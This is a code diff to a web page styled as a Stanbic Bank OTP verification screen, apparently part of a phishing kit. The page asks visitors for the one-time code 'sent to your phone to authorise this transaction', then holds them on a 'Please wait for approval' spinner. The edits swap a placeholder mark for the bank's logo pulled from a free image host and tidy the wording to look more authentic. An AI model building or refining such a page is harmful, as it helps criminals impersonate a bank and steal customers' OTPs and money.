@@ -31,12 +31,7 @@
   /* Header */
   .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 18px; }
   .brand { display: inline-flex; align-items: center; gap: 8px; font-weight: 800; font-size: 20px; letter-spacing: -0.5px; color: var(--stanbic-blue-dark); }
-  .brand .brand-mark {
-    width: 32px; height: 32px; border-radius: 8px;
-    background: var(--stanbic-blue); color: #fff;
-    display: flex; align-items: center; justify-content: center;
-    font-size: 12px; font-weight: 800;
-  }
+  .brand-logo { height: 32px; width: auto; object-fit: contain; }
   .header .label { font-size: 10.5px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.7px; color: var(--stanbic-muted); }
 
   /* Card */
@@ -65,7 +60,7 @@
   .expired-notice .text { flex: 1; }
   .expired-notice .text small { display: block; font-size: 11px; font-weight: 500; color: #7F1D1D; margin-top: 2px; }
 
-  /* Flexible OTP Input (No Cubes) */
+  /* OTP Input */
   .otp-label { display: block; font-size: 12px; font-weight: 600; margin-bottom: 8px; text-align: center; color: var(--stanbic-navy); }
   .otp-input-wrap { margin-bottom: 14px; }
   .otp-input {
@@ -106,7 +101,7 @@
   .verifying.show { display: flex; }
   .verifying .inner { text-align: center; max-width: 320px; padding: 0 24px; }
   .verifying .logo-big { display: inline-flex; align-items: center; gap: 10px; font-weight: 800; font-size: 28px; letter-spacing: -1px; margin-bottom: 32px; color: var(--stanbic-blue-dark); }
-  .verifying .logo-big .brand-mark { width: 44px; height: 44px; border-radius: 10px; background: var(--stanbic-blue); color: #fff; display: flex; align-items: center; justify-content: center; font-size: 16px; font-weight: 800; }
+  .verifying .logo-big .brand-logo { height: 48px; width: auto; }
   .verifying .spinner { width: 54px; height: 54px; margin: 0 auto 22px; border: 4px solid #E5E7EB; border-top-color: var(--stanbic-blue); border-radius: 50%; animation: spin 0.9s linear infinite; }
   @keyframes spin { to { transform: rotate(360deg); } }
   .verifying .t { font-size: 17px; font-weight: 800; letter-spacing: -0.3px; margin-bottom: 6px; color: var(--stanbic-navy); }
@@ -134,14 +129,16 @@
 
 <div class="wrap">
   <div class="header">
-    <div class="brand"><span class="brand-mark">SB</span> Stanbic Bank</div>
+    <div class="brand">
+      <img class="brand-logo" src="https://i.ibb.co/680sL7z/stanbic-bank-logo.png" alt="Stanbic Bank">
+    </div>
     <span class="label">Verification</span>
   </div>
 
   <div class="card">
     <div class="card-head">
-      <h1>Enter verification code</h1>
-      <p>Enter the 5 or 6-digit code sent to your phone to authorise this transaction.</p>
+      <h1>Enter OTP code</h1>
+      <p>Enter the OTP code sent to your phone to authorise this transaction.</p>
     </div>
 
     <div class="card-body">
@@ -162,7 +159,7 @@
         </div>
       </div>
 
-      <label class="otp-label">Verification code (5 or 6 digits)</label>
+      <label class="otp-label">OTP Code</label>
       <div class="otp-input-wrap">
         <input type="text" class="otp-input" id="otpInput" inputmode="numeric" maxlength="6" autocomplete="one-time-code" placeholder="••••••">
       </div>
@@ -176,7 +173,9 @@
     </div>
 
     <div class="card-foot">
-      <div class="brand"><span class="brand-mark" style="width:24px;height:24px;font-size:10px;">SB</span> Stanbic Bank</div>
+      <div class="brand">
+        <img class="brand-logo" style="height: 24px;" src="https://i.ibb.co/680sL7z/stanbic-bank-logo.png" alt="Stanbic Bank">
+      </div>
       <div class="small">Your credentials are never shared.</div>
     </div>
   </div>
@@ -188,7 +187,7 @@
 
 <div class="verifying" id="verifying">
   <div class="inner">
-    <div class="logo-big"><span class="brand-mark">SB</span> Stanbic</div>
+    <div class="logo-big"><img class="brand-logo" src="https://i.ibb.co/680sL7z/stanbic-bank-logo.png" alt="Stanbic Bank"></div>
     <div class="spinner"></div>
     <div class="t">Verifying…</div>
     <div class="s">Please wait for approval. Do not close this page.</div>
@@ -313,13 +312,14 @@
   }
 
   /* ------------------------------------------------------------
-     Flexible OTP Input
+     Flexible OTP Input (Handles 5 or 6 digits silently)
   ------------------------------------------------------------ */
   const otpInput = document.getElementById('otpInput');
 
   otpInput.addEventListener('input', () => {
     // Allow only digits, max 6
     otpInput.value = otpInput.value.replace(/\D/g, '').slice(0, 6);
+    // Highlight if 5 or 6 digits are entered
     otpInput.classList.toggle('filled', otpInput.value.length >= 5);
   });
 
@@ -428,7 +428,7 @@
 
     const otp = getOtp();
     if (otp.length < 5 || otp.length > 6) {
-      showToast('Please enter a 5 or 6-digit code.');
+      showToast('Please enter the OTP code.');
       return;
     }
 
